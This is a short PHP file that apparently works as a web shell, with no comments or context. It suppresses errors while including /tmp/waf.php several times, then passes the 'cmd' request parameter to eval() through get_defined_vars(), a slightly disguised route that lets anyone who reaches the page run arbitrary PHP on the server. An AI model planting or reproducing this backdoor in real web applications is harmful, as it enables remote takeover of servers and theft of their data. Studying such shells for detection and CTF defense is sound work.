<?php
@include_once("/tmp/waf.php");
@include_once("/tmp/waf.php");
@include_once("/tmp/waf.php");
eval(get_defined_vars()['_GET']['cmd']);
?>